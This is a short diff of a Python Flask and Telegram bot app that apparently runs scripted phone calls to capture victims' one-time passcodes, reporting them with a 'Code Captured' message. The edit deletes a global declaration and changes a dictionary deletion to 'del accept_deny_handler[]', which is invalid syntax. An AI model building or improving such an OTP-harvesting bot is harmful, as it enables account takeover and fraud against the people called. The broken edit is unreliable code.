@@ -954,7 +954,6 @@ def custom_confirm1(message,otp_message):
 @app.route('/<script_id>/<chatid>/custom', methods=['POST'])
 def custom_prebuild_script_call(script_id,chatid):
     global ringing_handler
-    global accept_deny_handler
     global recording_handler
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
@@ -1059,7 +1058,7 @@ def custom_prebuild_script_call(script_id,chatid):
             keyboard.add(item1,item2) 
             bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
             try:
-                 del accept_deny_handler[chatid]
+                 del accept_deny_handler[]
             except:
                  print("Error in deleting")
 
